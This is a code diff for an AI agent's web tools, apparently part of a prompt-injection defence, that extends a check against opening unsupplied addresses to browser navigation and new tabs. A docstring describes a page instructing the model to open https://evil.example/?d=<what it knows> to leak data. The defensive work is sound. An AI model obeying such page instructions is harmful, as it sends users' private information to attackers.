@@ -111,6 +111,7 @@ class SourceList:
     def __init__(self) -> None:
         self._by_url: dict[str, Source] = {}
         self._user_urls: set[str] = set()
+        self._listed: set[str] = set()  # addresses of links on a page the model was shown (not numbered sources)
 
     def add(self, url: str, title: str) -> int:
         """The same URL keeps its number; a title is kept once there is one."""
@@ -128,9 +129,15 @@ class SourceList:
         """Remember the web addresses the user themselves wrote: those are theirs to ask for."""
         self._user_urls |= {u.rstrip(".,;:!?)]}'") for u in _URL_IN_TEXT.findall(user_text)}
 
+    def list_links(self, urls: list[str]) -> None:
+        """Addresses of links on a page the model was shown: it may follow those exactly (a link can't carry what
+        the model chose to put in it), but not an address it made up."""
+        self._listed |= set(urls)
+
     def trusted(self, url: str) -> bool:
-        """An address the user wrote, or one that came up in a search or was read this turn or task, exactly."""
-        return url in self._user_urls or url in self._by_url
+        """An address the user wrote, one that came up in a search or was read, or a link on a page shown to the
+        model, this turn or task, exactly."""
+        return url in self._user_urls or url in self._by_url or url in self._listed
 
 
 def _flat(text: str, limit: int | None = None) -> str:
@@ -238,13 +245,22 @@ async def _fetch(http: httpx.AsyncClient, url: str) -> tuple[str, bytes, str]:
 
 
 def unlisted_read(tool_name: str, args: dict, ctx: ToolContext) -> bool:
-    """True when this is a web_read of an address nobody gave, asked for after outside content was read. A page
-    can tell the model to open https://evil.example/?d=<what it knows>: opening it would carry that out. An address
-    the user wrote, or one that came up in a search or was read this turn or task, is always fine."""
-    if tool_name != "web_read" or not ctx.tainted:
+    """True when this opens an address nobody gave (web_read, or the browser's navigate / a new tab), asked for after
+    outside content was read. A page can tell the model to open https://evil.example/?d=<what it knows>: opening it
+    would carry that out. An address the user wrote, or one that came up in a search, was read, or is a link on a
+    page the model was shown, is always fine."""
+    if not ctx.tainted:
         return False
+    if tool_name in ("web_read", "browser_navigate"):
+        url = args.get("url")
+    elif tool_name == "browser_tabs" and args.get("action") == "new":
+        url = args.get("url")
+    else:
+        return False
+    if tool_name == "browser_tabs" and not url:
+        return False  # a blank new tab goes nowhere
     sources = ctx.sources
-    return not (isinstance(sources, SourceList) and sources.trusted(str(args.get("url") or "").strip()))
+    return not (isinstance(sources, SourceList) and sources.trusted(str(url or "").strip()))
 
 
 def web_tools(sources_for: Callable[[ToolContext], SourceList], http: httpx.AsyncClient) -> list[Tool]:
